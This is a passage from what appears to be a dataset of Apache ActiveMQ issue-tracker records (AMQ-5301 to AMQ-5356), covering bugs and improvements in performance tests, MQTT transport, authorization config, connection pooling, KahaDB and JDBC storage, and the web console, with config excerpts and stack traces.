{1000071=LogInfo(/home/user/apache-activemq-5.10.0/data/leveldb/00000000000f4287.log,1000071,1000009), 2000080=LogInfo(/home/user/apache-activemq-5.10.0/data/leveldb/00000000001e84d0.log,2000080,1000011), 3000091=LogInfo(/home/user/apache-activemq-5.10.0/data/leveldb/00000000002dc71b.log,3000091,0)} | org.apache.activemq.leveldb.RecordLog | main
issueID:AMQ-5301
type:Improvement
changed files:AbstractJmsClient.java
texts:Destination should not have numerical suffix for single-dest perf tests
The performance test module assumes that multiple destinations will be put under load, and thereby assigns a numerical suffix to the destination name specified on the command line. Thus a producer/consumer configured to topic://foo will actually send/receive from topic://foo.0. This is annoying, as when load testing a particular broker setup (such as with composite destinations), you need to be explicit about which destination is being targeted and it is not always possible to tweak the broker configuration.I propose that for single-destination tests, no numerical suffix is added. Patch incoming.
issueID:AMQ-5303
type:Bug
changed files:
texts:MQTT Subscriptions on VirtualTopic prefixed destinations failed retained tests.
For an MQTT Subscription on a Virtual Topic such as "VirtualTopic.FOO" the retained message contract doesn"t seem to be honoured
issueID:AMQ-5304
type:Bug
changed files:TempDestinationAuthorizationEntry.java
XBeanAuthorizationMap.java
texts:groupClass not applied to TempDestinationAuthorizationEntry
When configuring the authorization plugin with a <tempDestinationAuthorizationEntry> that also set a groupClass, this groupClass is not properly applied to the TempDestinationAuthorizationEntry instance. E.g. consider this example config      <authorizationPlugin>        <map>          <authorizationMap groupClass="org.apache.karaf.jaas.boot.principal.RolePrincipal">            <authorizationEntries>              <authorizationEntry queue=">" read="admin" write="client,admin" admin="client,admin" />              <authorizationEntry topic=">" read="client,admin" write="admin" admin="admin"/>              <authorizationEntry topic="ActiveMQ.Advisory.>" read="admin,client" write="admin,client" admin="admin"/>           </authorizationEntries>           <tempDestinationAuthorizationEntry>             <tempDestinationAuthorizationEntry read="client,admin" write="client,admin" admin="client,admin" groupClass="org.apache.karaf.jaas.boot.principal.RolePrincipal"/>           </tempDestinationAuthorizationEntry>         </authorizationMap>        </map>      </authorizationPlugin>The groupClass attribute is set on the TempDestinationAuthorizationEntry instance but we don"t apply the groupClass to the AuthorizationEntry by calling afterPropertiesSet();As a result, authorization fails when trying to create a temp destination. This can happen when deploying the broker inside a Karaf container and have Karaf do the authentication (such as in JBoss A-MQ). The groupClass is properly set on the authorizationEntries within the <authorizationEntries> list and only fails to be applied properly on the tempDestinationAuthorizationEntry.
issueID:AMQ-5305
type:Improvement
changed files:
texts:runtime configuration - allow changes to <destinations> configuration elements
Extend the runtime configuration feature (AMQ-4682) to allow changes to the <destinations> configuration element.As of 5.10.0 if you create a compositeTopic with queues/topics or filtered destinations within the <destinationInterceptors><virtualDestinationInterceptor><virtualDestinations> element the CompositeTopic will not showup in the Broker Manager Topics page.<destinationInterceptors>   <virtualDestinationInterceptor>    <virtualDestinations>     <!-- Add this compositeTopic after ActiveMQ start -->     <compositeTopic name="CompositeTopic" forwardOnly="false">      <forwardTo>       <queue physicalName="ForwardedQueue" />      </forwardTo>     </compositeTopic>    </virtualDestinations>   </virtualDestinationInterceptor>  </destinationInterceptors>  <destinations>   <!-- CompositeTopic and ForwardedQueue queue will not showup in the Broker Manager unless these are defined (or someone sends a message to the CompositeTopic. -->   <!--<topic physicalName="CompositeTopic" />-->   <!--<queue physicalName="ForwardedQueue" />-->  </destinations>Note: This is more just a usability/management improvement.The broker does correctly forward messages to the ForwardedQueue, if it is not defined in the <destinations> element.
issueID:AMQ-5306
type:Bug
changed files:
texts:Composite destination creation in perf test always builds topics
When the performance test is triggered via the following flags, the resulting test run sends messages to two topics, as opposed to queues:mvn activemq-perf:producer -Dproducer.composite=true -DsysTest.totalDests=2 -Dproducer.destName=queue://fooMessages will be sent to topic://foo.0 and topic://foo.1.Pull request incoming.
issueID:AMQ-5307
type:Bug
changed files:
texts:MQTT Transport codec does not properly deal with partial read of frame header
The Codec used to parse MQTT Frames does not properly deal with the case where only part of the initial frame header arrives.  This can happen in NIO+SSL etc where the incoming packet has only the first byte or so of the frame which causes the process header method get stuck in an endless loop.
issueID:AMQ-5308
type:Improvement
changed files:
texts:MQTT NIO and NIO+SSL transports can be slow when reading in larger messages
The MQTTCodec class reads in message content a byte at a time which can result in very slow reads for larger messages.   Instead the code should use a buffer and fill it with as much data as it can in one shot each time a chunk of data is received.
issueID:AMQ-531
type:Bug
changed files:
texts:XBean has a runtime issue with Spring 2.0M2
Apparently there is an issue with XBean now that Spring 2.0 (starting with M2) is compiled against a Java 5 compiler (http://jira.codehaus.org/browse/XB-7).  It"s probably worth investigating how long before XBean releases a fix and postponing the 4.0 release until they do.  If not, at least documenting in a known issues list that ActiveMQ 4.0 can"t working with 2.0M2 and later until a later release where they do fix it.
issueID:AMQ-5310
type:Bug
changed files:
texts:activemq-client - Throws IllegalStateException in receive method which should be a JMSException
There is a change in activemq-client in the receive method, where it does a checkClosed call that throws an IllegalStateException which is not supposed according to JMS spec. This causes camel-jms / spring jms to not shutdown nicely and causes the JMS listener to hang, and also other side-effects.For example the camel example pojo messaging demonstrates that. Just start the example according to its readme, and then shutdown the JVM with ctrl + c, and it hangs [Thu Aug 07 10:33:27 CEST 2014]; root of context hierarchy]2014-08-07 10:33:42,965 [Thread-1       ] INFO  SpringCamelContext             - Apache Camel 2.14-SNAPSHOT (CamelContext: camel-1) is shutting down2014-08-07 10:33:42,971 [sonnel.records]] WARN  ultJmsMessageListenerContainer - Setup of JMS message listener invoker failed for destination "personnel.records" - trying to recover. Cause: The Consumer is closedjavax.jms.IllegalStateException: The Consumer is closed at org.apache.activemq.ActiveMQMessageConsumer.checkClosed(ActiveMQMessageConsumer.java:861) at org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:618) at org.apache.activemq.jms.pool.PooledMessageConsumer.receive(PooledMessageConsumer.java:67) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveMessage(AbstractPollingMessageListenerContainer.java:430) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.doReceiveAndExecute(AbstractPollingMessageListenerContainer.java:310) at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:263) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1101) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1093) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:990) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)2014-08-07 10:33:42,975 [Thread-1       ] DEBUG BeanComponent                  - Clearing BeanInfo cache[size=2, hits=0, misses=2, evicted=0]2014-08-07 10:33:42,975 [sonnel.records]] ERROR ultJmsMessageListenerContainer - Could not refresh JMS Connection for destination "personnel.records" - retrying in 5000 ms. Cause: nulljava.lang.NullPointerException at org.springframework.jms.listener.AbstractJmsListeningContainer.refreshSharedConnection(AbstractJmsListeningContainer.java:392) at org.springframework.jms.listener.DefaultMessageListenerContainer.refreshConnectionUntilSuccessful(DefaultMessageListenerContainer.java:885) at org.springframework.jms.listener.DefaultMessageListenerContainer.recoverAfterListenerSetupFailure(DefaultMessageListenerContainer.java:861) at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:1012) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)2014-08-07 10:33:42,975 [Thread-1       ] DEBUG TimerListenerManager           - Removed TimerListener: org.apache.camel.management.mbean.ManagedCamelContext@2a2bc16As you can see from this stacktrace there is a NPE error inside spring jms which causes it not to shutdown correctly also.
issueID:AMQ-5311
type:Bug
changed files:
texts:XAException message should encode the xaErrorCode
openwire will only marshall the message string, so an XAException will always be initialised clients side with errorCode=0, which maps to XA_OK or an invalid error code.Appending xaErrorCode:X to the message will allow the XAException.errorCode to be extracted client side and propagated correctly, so a TM can respond to an XAER_NOTA.Currently we set a generic XAER_RMERR which can force the TM to retry.
issueID:AMQ-5312
type:Improvement
changed files:JcaPooledConnectionFactory.java
PooledConnectionFactory.java
XaPooledConnectionFactory.java
texts:activemq-pool - Should not log expired connection when the pool is stopped as that causes log floods during shutdown
If you shutdown amq client + pool and whatnot, then you may get excessive logs about expired connections, as they are logged at INFO level.Example2014-08-07 14:23:42,572 [est-broker-2#16] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-5:1,clientId=ID:davsclaus.air-50586-1407414219217-4:1,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-2#17) stopped.2014-08-07 14:23:42,575 [est-broker-3#32] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-7:1,clientId=ID:davsclaus.air-50586-1407414219217-6:1,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-3#33) stopped.2014-08-07 14:23:42,575 [test-broker-1#4] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-3:3,clientId=ID:davsclaus.air-50586-1407414219217-2:3,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-1#5) stopped.2014-08-07 14:23:42,576 [test-broker-1#0] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-3:1,clientId=ID:davsclaus.air-50586-1407414219217-2:1,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-1#1) stopped.2014-08-07 14:23:42,577 [est-broker-2#18] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-5:2,clientId=ID:davsclaus.air-50586-1407414219217-4:2,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-2#19) stopped.2014-08-07 14:23:42,577 [est-broker-3#38] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-7:4,clientId=ID:davsclaus.air-50586-1407414219217-6:4,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-3#39) stopped.2014-08-07 14:23:42,578 [test-broker-1#6] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-3:4,clientId=ID:davsclaus.air-50586-1407414219217-2:4,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-1#7) stopped.2014-08-07 14:23:42,578 [est-broker-3#36] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-7:3,clientId=ID:davsclaus.air-50586-1407414219217-6:3,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-3#37) stopped.2014-08-07 14:23:42,579 [test-broker-1#2] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-3:2,clientId=ID:davsclaus.air-50586-1407414219217-2:2,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-1#3) stopped.2014-08-07 14:23:42,579 [test-broker-1#8] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-3:5,clientId=ID:davsclaus.air-50586-1407414219217-2:5,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-1#9) stopped.2014-08-07 14:23:42,579 [est-broker-3#34] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-7:2,clientId=ID:davsclaus.air-50586-1407414219217-6:2,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-3#35) stopped.2014-08-07 14:23:42,580 [est-broker-1#10] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-3:6,clientId=ID:davsclaus.air-50586-1407414219217-2:6,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-1#11) stopped.2014-08-07 14:23:42,581 [est-broker-2#20] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-5:3,clientId=ID:davsclaus.air-50586-1407414219217-4:3,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-2#21) stopped.2014-08-07 14:23:42,582 [est-broker-3#40] INFO  PooledConnectionFactory        - Expiring connection ActiveMQConnection {id=ID:davsclaus.air-50586-1407414219217-7:5,clientId=ID:davsclaus.air-50586-1407414219217-6:5,started=false} on IOException: org.apache.activemq.transport.TransportDisposedIOException: peer (vm://test-broker-3#41) stopped.2014-08-07 14:23:42,582 [MQ ShutdownHook] INFO  TransportConnector             - Connector vm://test-broker-1 stoppedWe should reduce this noise and only log if we are not stopped.
issueID:AMQ-5315
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:NullPointerException in DemandForwardingBridgeSupport.collectBrokerInfos
We have seen the following NPE setting up a demand forwarding bridgejava.lang.NullPointerException: null at org.apache.activemq.network.DemandForwardingBridgeSupport.collectBrokerInfos(DemandForwardingBridgeSupport.java:365) [activemq-broker-5.10.0.jar:5.10.0] at org.apache.activemq.network.DemandForwardingBridgeSupport.access$400(DemandForwardingBridgeSupport.java:105) [activemq-broker-5.10.0.jar:5.10.0] at org.apache.activemq.network.DemandForwardingBridgeSupport$5.run(DemandForwardingBridgeSupport.java:331) [activemq-broker-5.10.0.jar:5.10.0] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) [na:1.7.0_60] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) [na:1.7.0_60] at java.lang.Thread.run(Thread.java:745) [na:1.7.0_60]This occurred in one of our tests but only under load so seems to be a race condition of some sort.
issueID:AMQ-5316
type:Bug
changed files:LoggingBrokerPlugin.java
texts:LoggingBrokerPluggin, configuration variable logMessageEvents is not used
LoggingBrokerPluggin.logMessageEvents is not used.It would be good to remove it from the configuration to avoid confusion - patch attached.It would also be good to remove this from http://activemq.apache.org/logging-interceptor.html
issueID:AMQ-5317
type:Bug
changed files:
texts:NPE on brokerView addConnector
Doing a quick sanity of transport connector stop/start via remove/add found:java.lang.NullPointerException at org.apache.activemq.broker.TransportConnector.start(TransportConnector.java:202) at org.apache.activemq.broker.jmx.BrokerView.addConnector(BrokerView.java:358) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at sun.reflect.misc.Trampoline.invoke(MethodUtil.java:75) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at sun.reflect.misc.MethodUtil.invoke(MethodUtil.java:279) at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:112) at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMBeanIntrospector.java:46) at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(MBeanIntrospector.java:237) at com.sun.jmx.mbeanserver.PerInterface.invoke(PerInterface.java:138) at com.sun.jmx.mbeanserver.MBeanSupport.invoke(MBeanSupport.java:252) at javax.management.StandardMBean.invoke(StandardMBean.java:405) at org.apache.activemq.broker.jmx.AnnotatedMBean.invoke(AnnotatedMBean.java:198) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:819) at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:801) at javax.management.MBeanServerInvocationHandler.invoke(MBeanServerInvocationHandler.java:292) at com.sun.proxy.$Proxy5.addConnector(Unknown Source) at org.apache.activemq.broker.jmx.MBeanTest.testAddRemoveConnectorBrokerView(MBeanTest.java:1384) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.junit.runner.JUnitCore.run(JUnitCore.java:160) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:74) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:202) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:65) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
issueID:AMQ-5318
type:Bug
changed files:
texts:JDBC store; commit called on connection that uses autocommit during "deleteAllMessages" .
The oracle v12 driver throws the following exception if commit() is called on a connection that has auto-commit enabled(see &#91;1&#93;) . This seems to be a change in behaviour since v11.  caused by: java.sql.SQLException: Could not commit with auto-commit set on at oracle.jdbc.driver.PhysicalConnection.commit(PhysicalConnection.java:4443) at oracle.jdbc.driver.PhysicalConnection.commit(PhysicalConnection.java:4490) at org.apache.commons.dbcp.DelegatingConnection.commit(DelegatingConnection.java:334) at org.apache.commons.dbcp.DelegatingConnection.commit(DelegatingConnection.java:334) at org.apache.commons.dbcp.PoolingDataSource$PoolGuardConnectionWrapper.commit(PoolingDataSource.java:211) at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doDropTables(DefaultJDBCAdapter.java:148) at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.deleteAllMessages(JDBCPersistenceAdapter.java:534) ... 40 moreIn the org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter#doDropTables() it explicitly calls connection.commit() without checking if auto-commit is enabled.  In other places auto-commit does seem to be checked before commit is called  - org.apache.activemq.store.jdbc.TransactionContext#commit().The v12 driver does allow  autocommit-SpecCompliance to be turned off by setting system property "oracle.jdbc.autoCommitSpecCompliant=false". But it does seem like org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter#doDropTables() is not strictly adhering to the spec. I think it would be better to do a check if auto-commit is on before calling connection.commit(). I will attach a github pull request with test and potential fix - for someone to review.
issueID:AMQ-5320
type:Bug
changed files:SizeStatisticImpl.java
texts:Incorrect Documentation  in org.apache.activemq.management.SizeStatisticImpl
org.apache.activemq.management.SizeStatisticImpl has incorrect / misleading documentation for getters method.I feel instead of time they should use size in documentation.
issueID:AMQ-5323
type:Bug
changed files:
texts:ActiveMQ Message getProperty and setProperty inconsistent behaviour
When you retrieve the JMSDeliveryMode property from an ActiveMQ message, it returns either "PERSITENT" or "NON_PERSISTENT".However, when using the set property, it only supports either Integer values or Boolean values.That is why is sensible to support the mapping from the above string representation ("PERSITENT" or "NON_PERSISTENT") to integer (1 or 2).
issueID:AMQ-5333
type:Bug
changed files:JAXPXPathEvaluator.java
XalanXPathEvaluator.java
XPathExpression.java
texts:XPath selector - make xml parser features configurable
We need to be able to set xml parser features configurable using system properties.
issueID:AMQ-5336
type:Improvement
changed files:
texts:Validate priorityBackupURIs against list of failover URIs
The following priority back up config does not work: failover:(tcp://localhost:1234,tcp://primary1:1234,tcp://secondary1:1234)?                        nested.socket.tcpNoDelay=true&                        nested.soTimeout=60000&                        nested.closeAsync=false&                        randomize=false&                        priorityBackup=true&                        priorityURIs=tcp://localhost:1234This is because the full connected URI is used when testing whether the  current connection is the priority connection. In the above example the nested socket params are added to the actual connected URI which then does not match tcp://localhost:1234 as setup in the priority list.This causes the transport to continually try to reconnect to the primary, even though it is already connected to it.Can it either take nested parameters into account so the above works as expected (it looks like a sensible URL to me) and/or validate that each of the priorityBackupURIs are valid URIs in the failover list
issueID:AMQ-5337
type:Bug
changed files:AdvisoryBroker.java
texts:Bug in ConcurrentLinkedQueue leads to excessive CPU-consumption by ActiveMQ process
The AdvisoryBroker use a ConcurrentLinkedQueue to store consumers.This standard JDK class has a bug which can lead to an OutOfMemory : https://bugs.openjdk.java.net/browse/JDK-8054446In our environment we observe that ActiveMQ process cpu usage is continually climbing and that the ConcurrentLinkedQueue in the AdvisoryBroker grows indefinitely.The ConcurrentLinkedQueue is a non-blocking concurrent FIFO datastructure provided by the core Java Development Kit API starting from Java 5. AdvisoryBroker use offer() method to add a new consumer in the ConcurrentLinkedQueue, and remove() method to remove it.When the consumer removed is the last element of the queue, the Consumer object is nulled but a node remain in the queue. The null node is then never garbage collected. This is true only for the last element of the queue. Any other element is removed safely.Related bug : https://issues.apache.org/jira/browse/AMQ-4853
issueID:AMQ-5340
type:Bug
changed files:
texts:QueueBrowser with expired messages hangs until woken by expired messages background job
I would expect browsing a queue with only a few messages to not take a long time. Indeed it normally takes only a few ms. in my application. But sometimes the ActiveMQQueueBrowser hangs for up to 30 seconds at method before returning!When the issue occurs, the loop in hasMoreElements() calls waitForMessage() multiple times which times out after 2s at semaphore.wait(2000) without receiving any message from the broker. I found that when the broker"s background job that checks for expired messages runs, the browser happens to be woken even if there are no expired messages. So setting the expireMessagesPeriod to a low value (e.g. 200ms) is a good workaround for this issue, but this is quite brittle because it uses internal broker implementation that may not even be related to the issue!To reproduce: (this is what I do in my application) create a queue, send a few message with an expiration time of 10 seconds and repeatedly browse it until it is empty. If I browse the queue after these 10 seconds have passed, the issue occurs! I can always reproduce the issue by running AMQ580BrowsingBug from the related bug report AMQ-4595: this browsing test seems to always hang. I slightly adjusted the test so you can easily change the expired messages period and see the runtime differ when changing this.
issueID:AMQ-5344
type:Improvement
changed files:
texts:Replace bundle dependencies with connector feature
Replace:<bundle dependency="true">mvn:org.apache.aries.transaction/org.apache.aries.transaction.manager/1.0.0</bundle>      <bundle dependency="true">mvn:org.apache.geronimo.specs/geronimo-j2ee-connector_1.5_spec/2.0.0</bundle>with connector feature from karaf to avoid several transaction managers to get active.
issueID:AMQ-5345
type:Bug
changed files:
texts:Improve LDAP communication
Various improvement in how we communicate with LDAP
issueID:AMQ-5346
type:Improvement
changed files:
texts:Update Proton to version 0.8
As part of the next release we will want to move up to Proton v0.8 which will incorporate several fixes as well as improvements in the codec speed and memory usage.  For now we should move onto the published 1.0-SNAPSHOT builds and start testing to find any issues that fall out from the upgrade.  Dejan has already created a patch that deals with the API changes.
issueID:AMQ-5347
type:Bug
changed files:
texts:persistJMSRedelivered flag doesn&#39;t work correctly when exceptions occur
The new flag in 5.10 that ensures the JMSRedelivered flag persists across broker restarts does not work correctly when an exception occurs when attempting to write the "message update" to disk before the restart.  In that case, messages can be assigned to receivers, the broker can be restarted, and then the messages are re-assigned to receivers and do not include the JMSRedelivered flag as expected.  I will attach a unit test and proposed fix to illustrate the problem.Also, here is additional information I had sent to the mailing list:When using the new option persisteJMSRedelivered (to ensure the redelivered flag is set correctly on potentially duplicate messages that are re-dispatched by the broker even after a restart): <policyEntry queue=">" persistJMSRedelivered="true"></policyEntry>there is still a case where a message can be re-sent and will not be marked as redelivered.  I can open a JIRA and probably create a unit test but it is pretty clear from the pasted code below where the exception is getting swallowed.  Would the preferred fix be to update the broker interface and make preProcessDispatch throw an IOException or would it be better to add a new field to the MessageDispatch class to indicate an exception occurred and leave the interface alone?The specific case when this can happen is when a MessageStore returns an exception during the updateMessage call, which then gets swallowed (and an ERROR logged) and still allows the message to be dispatched to the consumer.  The exception seems like it should actually propagate out of the preProcessDispatch function in RegionBroker as shown below, but this would require changing the Broker interface and making the void preProcessDispatch function throw an IOException.//RegionBroker.java    @Override    public void preProcessDispatch(MessageDispatch messageDispatch) {        Message message = messageDispatch.getMessage();        if (message != null) {            long endTime = System.currentTimeMillis();            message.setBrokerOutTime(endTime);            if (getBrokerService().isEnableStatistics()) {                long totalTime = endTime - message.getBrokerInTime();                ((Destination) message.getRegionDestination()).getDestinationStatistics().getProcessTime().addTime(totalTime);            }            if (((BaseDestination) message.getRegionDestination()).isPersistJMSRedelivered() && !message.isRedelivered() && message.isPersistent()) {                final int originalValue = message.getRedeliveryCounter();                message.incrementRedeliveryCounter();                try {                    ((BaseDestination) message.getRegionDestination()).getMessageStore().updateMessage(message);                } catch (IOException error) {                    LOG.error("Failed to persist JMSRedeliveryFlag on {} in {}", message.getMessageId(), message.getDestination(), error);                } finally {                    message.setRedeliveryCounter(originalValue);                }            }        }    }//TransportConnection.java    protected void processDispatch(Command command) throws IOException {        MessageDispatch messageDispatch = (MessageDispatch) (command.isMessageDispatch() ? command : null);        try {            if (!stopping.get()) {                if (messageDispatch != null) {                    broker.preProcessDispatch(messageDispatch);                }                dispatch(command);  //This code will dispatch the message whether or not the updateMessage function actually worked            }        ...
issueID:AMQ-5350
type:Bug
changed files:
texts:Separate the AMQP maxFrameSize setting from the WireFormat maxFrameSize setting.
We currently set the maxFrameSize value in Proton using the WireFormat maxFrameSize value.  This not the correct application of this property as it is meant to control the max size a frame we will accept before we disconnect a client whereas in AMQP this control how large a frame is before the transport starts splitting the data into multiple frames.  Setting this value on Proton has other side effects like increased memory utilization and decreased performance.  Instead of linking these we should introduce an additional property on the AMQP WireFormat class to allow for setting the maxAmqpFrameSize which defaults to no max.
issueID:AMQ-5351
type:New Feature
changed files:
texts:Create a Camel routes plugin to load routes dynamically into the broker
The Broker camel component allows flexibility to change messaging internally in the broker. To add more flexibility, allowing changes to a CamelContext loaded by the plugin dynamically, will allow routes to modified on the fly without restarting the broker.
issueID:AMQ-5352
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP messages published transactionally should be accepted using a TransactionalState
Currently, when an incoming AMQP message is part of a transaction, it is accepted using the regular Accepted terminal state on the disposition reply. According to the spec &#91;1&#93; the disposition should actually use a TransactionalState with Accepted outcome.&#91;1&#93; http://docs.oasis-open.org/amqp/core/v1.0/os/amqp-core-transactions-v1.0-os.html#doc-idp111808
issueID:AMQ-5353
type:Bug
changed files:
texts:Mismatch of camel versions allowed
The Karaf features file allows a Camel range of [2.12,3).   However, that range is not entered into the bundle plugin for the modules that import camel so they result in having a range of [2.13,3) precluding them from working with Camel 2.12.
issueID:AMQ-5354
type:Bug
changed files:MessageDatabase.java
texts:persistJMSRedelivered feature breaks the ability for KahaDB to compact its journal files
While doing testing with persistJMSRedelivered enabled in the ActiveMQ config file (which is new in 5.10), it became obvious that the KahaDB transaction log files are never being compacted even though all messages had been consumed.  This is very easy to reproduce using a standard config with the following policyEntry to enable the feature:<destinationPolicy>            <policyMap>              <policyEntries>                <policyEntry queue=">" persistJMSRedelivered="true"></policyEntry>After waiting several minutes it was obvious the KahaDB transaction logs (~2500 files using 30GB of disk space) were not getting compacted and a log with DEBUG enabled (attached) shows that the files are getting filtered out as gc candidates.Since the updateMessage function is essentially doing a second "add message" operation down in KahaDB, it appears that the reference to the original message is not being cleaned up from the locationIndex preventing compaction of any message.  I will attach a patch that fixes the issue but this appears to be a pretty critical issue when using the persistJMSRedelivered feature.
issueID:AMQ-5356
type:Bug
changed files:
texts:Unable to see message contents from the web UI
When browsing the messages from a queue I"m unable to go into the message"s content. Does Jetty need to be upgraded?The URL I"m trying to reach (/admin/message.jsp):http://192.168.220.188:8161/admin/message.jsp?id=ID%3avcms1-53950-1410478946965-7%3a1%3a2%3a1%3a1&JMSDestination=contactupdatequeueI"m using JDK8, tried with 8u11 and 8u20.The output from ps:/usr/local/jdk1.8.0_20/bin/java -Xms1G -Xmx1G -Djava.util.logging.config.file=logging.properties -Djava.security.auth.login.config=/opt/activemq-5.10.0/conf/login.config -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote -Djava.awt.headless=true -Djava.io.tmpdir=/opt/activemq-5.10.0/tmp -Dactivemq.classpath=/opt/activemq-5.10.0/conf; -Dactivemq.home=/opt/activemq-5.10.0 -Dactivemq.base=/opt/activemq-5.10.0 -Dactivemq.conf=/opt/activemq-5.10.0/conf -Dactivemq.data=/opt/activemq-5.10.0/data -jar /opt/activemq-5.10.0/bin/activemq.jar startI get the following exception:2014-09-15 00:07:07,442 | INFO  | ActiveMQ WebConsole available at http://0.0.0.0:8161/ | org.apache.activemq.web.WebConsoleStarter | main2014-09-15 00:07:07,482 | INFO  | Initializing Spring FrameworkServlet "dispatcher" | /admin | main2014-09-15 00:07:07,808 | INFO  | jolokia-agent: No access restrictor found at classpath:/jolokia-access.xml, access to all MBeans is allowed | /api | main2014-09-15 01:25:58,377 | INFO  | Connector vm://localhost started | org.apache.activemq.broker.TransportConnector | qtp693267461-372014-09-15 01:25:59,870 | WARN  |  | org.eclipse.jetty.servlet.ServletHandler | qtp693267461-39org.apache.jasper.JasperException: PWC6033: Unable to compile class for JSPPWC6197: An error occurred at line: 20 in the jsp file: /WEB-INF/tags/form/forEachMapEntry.tagPWC6199: Generated servlet error:The type java.util.Map$Entry cannot be resolved. It is indirectly referenced from required .class files        at 